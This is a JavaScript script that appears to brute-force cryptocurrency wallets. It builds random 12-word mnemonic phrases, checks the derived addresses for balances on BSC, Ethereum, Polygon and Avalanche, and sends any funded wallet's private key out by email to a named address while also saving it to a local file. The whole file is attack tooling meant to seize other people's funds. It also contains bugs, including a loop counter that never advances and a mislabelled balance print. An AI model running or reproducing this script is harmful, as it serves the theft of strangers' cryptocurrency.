import ethers from 'ethers'
import { words } from "./words.js"
import fs from "fs";
import Web3 from "web3";
import MailUtil from "./mail.util.js";

const sleep = (ms) => { return new Promise(resolve => setTimeout(resolve, ms)) }
let a = 1

for (let start = 0; start < 999999; start + 0.1) {

    function getRandomInt(max) { return Math.floor(Math.random() * max) }

    let one = words.full.split(" ")[getRandomInt(2048)]
    let two = words.full.split(" ")[getRandomInt(2048)]
    let three = words.full.split(" ")[getRandomInt(2048)]
    let four = words.full.split(" ")[getRandomInt(2048)]
    let five = words.full.split(" ")[getRandomInt(2048)]
    let six = words.full.split(" ")[getRandomInt(2048)]
    let seven = words.full.split(" ")[getRandomInt(2048)]
    let eight = words.full.split(" ")[getRandomInt(2048)]
    let nine = words.full.split(" ")[getRandomInt(2048)]
    let ten = words.full.split(" ")[getRandomInt(2048)]
    let eleven = words.full.split(" ")[getRandomInt(2048)]
    let twelve = words.full.split(" ")[getRandomInt(2048)]
    let randomNumbers = one + " " + two + " " + three + " " + four + " " + five + " " + six + " " +
        seven + " " + eight + " " + nine + " " + ten + " " + eleven + " " + twelve

    try {
        let mnemonicWallet = ethers.Wallet.fromMnemonic(randomNumbers);
        if (mnemonicWallet._isSigner) {
            await sleep(100)

            let web3BSC = new Web3('https://bsc-dataseed1.binance.org:443')
            let balanceInBSC = web3BSC.utils.fromWei(await web3BSC.eth.getBalance(mnemonicWallet.address), "ether") // +++

            let web3ETHER = new Web3('https://eth-mainnet.gateway.pokt.network/v1/5f3453978e354ab992c4da79')
            let balanceInETHER = web3ETHER.utils.fromWei(await web3ETHER.eth.getBalance(mnemonicWallet.address), "ether") // +++

            let web3POLYGON = new Web3('https://polygon-rpc.com/')
            let balanceInPOLYGON = web3POLYGON.utils.fromWei(await web3POLYGON.eth.getBalance(mnemonicWallet.address), "ether") // +++

            let web3AVAX = new Web3('https://api.avax.network/ext/bc/C/rpc')
            let balanceInAVAX = web3AVAX.utils.fromWei(await web3AVAX.eth.getBalance(mnemonicWallet.address), "ether") // +++

            console.log("balanceInBSC" + balanceInBSC, "balanceInETHER" + balanceInETHER, "balanceInPOLYGON" + balanceInPOLYGON, "balanceInAVAX" + balanceInPOLYGON + "---" + a++)
            if (balanceInBSC > 0 || balanceInETHER > 0 || balanceInPOLYGON > 0 || balanceInAVAX > 0 ||
                mnemonicWallet.address === "0x0000000000000000000000000000000000000000") {
                await sleep(300)
                console.log("YEEEEEEEEEEEEESSSSSSSSSSSSSSSs your are a win!!!!")
                await MailUtil.sendEmail({
                    from: "andrey.kapertechov@idealogic.dev",
                    to: "andrey.kapertechov@idealogic.dev",
                    subject: 'your are a win!!!!',
                    text: ` Hello --- ${ mnemonicWallet.privateKey }`,
                });
                let mnemonicWallets = JSON.parse(fs.readFileSync("./mnemonicWallet.json", 'utf8'))
                const data = {
                    address: mnemonicWallet.address,
                    pk: mnemonicWallet.privateKey
                }
                mnemonicWallets.wallets.push(data)
                const result = JSON.stringify(mnemonicWallets, null, '\t')
                fs.writeFile('./mnemonicWallet.json', result, 'utf8', (err) => {
                    if (err) {
                        console.log(err)
                    }
                })
            }
        }
    } catch (e) {

    }
}
